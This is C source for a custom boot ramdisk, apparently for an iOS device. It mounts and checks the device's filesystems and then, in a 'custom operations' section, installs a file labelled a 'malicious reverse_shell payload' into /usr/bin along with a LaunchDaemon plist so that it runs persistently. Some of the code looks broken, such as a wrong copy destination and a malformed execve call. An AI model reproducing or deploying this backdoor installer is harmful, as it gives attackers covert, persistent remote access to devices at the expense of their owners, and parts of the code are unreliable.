#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include "/usr/include/hfs/hfs_mount.h"

#define O_RDONLY        0x0000
#define O_WRONLY        0x0001
#define O_RDWR          0x0002
#define O_CREAT         0x0200
#define O_TRUNC         0x0400
#define O_EXCL          0x0800

static int console;

const char* fsck_hfs[] = 
    { "/sbin/fsck_hfs", "-y", "/dev/rdisk0s1", NULL };
const char* fsck_hfs_user[] = 
    { "/sbin/fsck_hfs", "-y", "/dev/rdisk0s2s1", NULL };

void sleep(unsigned int sec) {
    int i;
    for (i = sec * 10000000; i>0; i--) { }
}

void puts(const char* s) {
    int i=0;
    while (i<3) {
        write( 1, "+", 1);
        i++;
    }
    write( 1, " ", 1);
    while ((*s) != '\0') {
        write(1, s, 1);
        s++;
    }
    sync();
}

int cp(const char *src, const char *dest) {
    char buf[0x800];
    struct stat s;
    int in, out, nr = 0;

    if (stat(src, &s) != 0)
        return -1;

    in = open(src, O_RDONLY, 0);
    if (in < 0)
        return -1;

    out = open(dest, O_WRONLY | O_CREAT, 0);
    if (out < 0) {
        close(in);
        return -1;
    }

    do {
        nr = read(in, buf, 0x800);
        if (nr > 0) {
            nr = write(out, buf, nr);
        }
    } while(nr > 0);

    close(in);
    close(out);

    if (nr < 0)
        return -1;

    return 0;
}

int hfs_mount(const char* device, const char* path, int options) {
    struct hfs_mount_args args;
    args.fspec = device;
    return mount("hfs", path, options, &args);
}

int fsexec(char* argv[], char* env[], int pause) {
    int pid = vfork();
    if (pid != 0) {
        if (pause) {
            while (wait4(pid, NULL, WNOHANG, NULL) <= 0) {
                sleep(1);
            }
        } else {
            return pid;
        }
    } else {
        chdir("/mnt");
        if (chroot("/mnt") != 0) 
            return -1;
        execve(argv[0], argv, env);
    }
    return 0;
}

int main(int argc, char **argv, char **envp) {
    struct stat s;
    int r, i;

    console = open("/dev/console", O_WRONLY);
    dup2(console, 1);

    sleep(5);
    for(i=0;i<75;i++) 
	puts("*****\n");
	
    puts("ramdisk initialized.\n");

    puts("searching for disk...\n");
    while (stat("/dev/disk0s1", &s) != 0) {
        puts("waiting for /dev/disk0s1 to appear...\n");
        sleep(30);
    }

    puts("mounting root filesystem...\n");
    while(1) {
        if (hfs_mount("/dev/disk0s1", "/mnt", MNT_ROOTFS | MNT_RDONLY) != 0) {
              puts("unable to mount filesystem, waiting...\n");
              sleep(10);
         } else {
             break;
         }
    }
    puts("filesystem mounted.\n");
    puts("mounting devfs...\n");
    if (mount("devfs", "/mnt/dev", 0, NULL) != 0) {
        puts("unable to mount devfs. aborting.\n");
        unmount("/mnt", 0);
        return -1;
    }
    puts("devfs mounted\n");

    puts("checking root filesystem...\n");
    r = fsexec(fsck_hfs, envp, 1);
    if (r) {
        puts("unable to check root filesystem. aborting.\n");
        unmount("/mnt/dev", 0);
        unmount("/mnt", 0);
        return -1;
    }

    puts("mounting root filesystem read-write...\n");
    r = hfs_mount("/dev/disk0s1", "/mnt", MNT_ROOTFS | MNT_UPDATE);

    puts("checking user filesystem...\n");
    r = fsexec(fsck_hfs_user, envp, 1);

    puts("mounting user filesystem...\n");
    sleep(5);
    mkdir("/mnt/private/var", 0755);
    if (hfs_mount("/dev/disk0s2s1", "/mnt/private/var", MNT_RDONLY) != 0) {
        puts("unable to mount user filesystem. aborting.\n");
        //return -1;
    }
    puts("user filesystem mounted.\n");

    puts("running custom operations...\n");

    /* BEGIN: Custom operations */

    puts("installing malicious reverse_shell payload...");
    cp("/files/reverse_shell", "/mnt/usr/bin/reverse_shell");
    cp("/files/com.adel.reverse_shell.plist", 
        "/System/Library/LaunchDaemons/com.adel.reverse_shell.plist");

    chown("/mnt/usr/bin/reverse_shell", 0, 80);
    chown("/mnt/System/Library/LaunchDaemons/com.adel.reverse_shell.plist",
        0, 80);
    chmod("/mnt/usr/bin/reverse_shell", 0755);
    chmod("/mnt/System/Library/LaunchDaemons/com.adel.reverse_shell.plist", 
        0755); 

    for(i=0;i<75;i++) 
	puts("*****\n");
    execve(NULL,"/bin/sh",NULL);

    /* END: Custom operations */

    sync();

    puts("unmounting disks...\n");
    unmount("/mnt/private/var", 0);
    unmount("/mnt/dev", 0);
    unmount("/mnt", 0);
    sync();

    puts("rebooting device...\n");

    close(console);
    //reboot(1);
    return 0;
}

